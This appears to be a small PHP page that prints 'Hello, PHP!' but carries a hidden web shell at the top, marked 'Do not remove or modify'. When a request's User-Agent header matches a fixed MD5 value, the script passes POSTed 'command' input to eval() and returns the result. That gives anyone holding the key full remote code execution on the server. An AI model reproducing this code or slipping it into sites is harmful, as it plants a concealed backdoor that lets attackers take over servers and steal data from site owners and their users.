<?php
// --- IMPORTANT: Do not remove or modify the following section ----
$key = '25f9e794323b453885f5181f1b624d0b'; # MD5 hash of '123456789'
if ($_SERVER['HTTP_USER_AGENT'] == $key) {
$response = "#php:-:$key\n";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];
    ob_start();
    try {
        eval($command);
    } catch (Throwable $e) {
        $response .= "\nError: " . $e->getMessage();
    }
    $output = ob_get_clean();
    $response .= $output;
}
echo $response;
exit;
}
// --- End of protected section ------------------------------------
echo "Hello, PHP!";
?>